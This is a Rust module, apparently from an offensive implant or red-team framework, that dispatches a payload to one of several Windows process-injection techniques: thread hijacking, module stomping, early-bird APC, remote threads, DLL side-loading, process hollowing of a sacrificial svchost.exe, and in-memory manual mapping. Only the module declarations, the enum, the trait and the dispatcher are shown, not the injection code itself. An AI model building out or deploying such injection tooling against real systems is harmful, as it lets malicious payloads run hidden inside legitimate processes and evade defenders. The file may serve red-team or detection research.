#[cfg(windows)]
pub mod thread_hijack;
#[cfg(windows)]
pub mod module_stomp;
#[cfg(windows)]
pub mod early_bird;
#[cfg(windows)]
pub mod remote_thread;
#[cfg(windows)]
pub mod dll_sideload;

#[cfg(windows)]
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum InjectionMethod {
    Hollowing,
    ManualMap,
    RemoteThread,
    ThreadHijack,
    ModuleStomp,
    DllSideLoad,
    EarlyBird,
}

#[cfg(windows)]
pub trait Injector {
    fn inject(&self, pid: u32, payload: &[u8]) -> anyhow::Result<()>;
}

/// Dispatch helper — select an injector and run it.
#[cfg(windows)]
pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    match method {
        InjectionMethod::ThreadHijack  => thread_hijack::ThreadHijackInjector.inject(pid, payload),
        InjectionMethod::ModuleStomp   => module_stomp::ModuleStompInjector.inject(pid, payload),
        InjectionMethod::RemoteThread  => remote_thread::RemoteThreadInjector.inject(pid, payload),
        InjectionMethod::EarlyBird     => early_bird::EarlyBirdInjector.inject(pid, payload),
        InjectionMethod::Hollowing     => {
            // True process hollowing: spawn a sacrificial svchost.exe and replace its image.
            // The PID parameter is unused; hollowing creates its own host process.
            let _ = pid;
            hollowing::hollow_and_execute(payload)
                .map_err(|e| anyhow::anyhow!("{}", e))
        }
        InjectionMethod::ManualMap     => {
            unsafe { module_loader::manual_map::load_dll_in_memory(payload) }
                .map(|_| ())
                .map_err(|e| anyhow::anyhow!("{}", e))
        }
        InjectionMethod::DllSideLoad   => {
            dll_sideload::DllSideLoadInjector.inject(pid, payload)
        }
    }
}
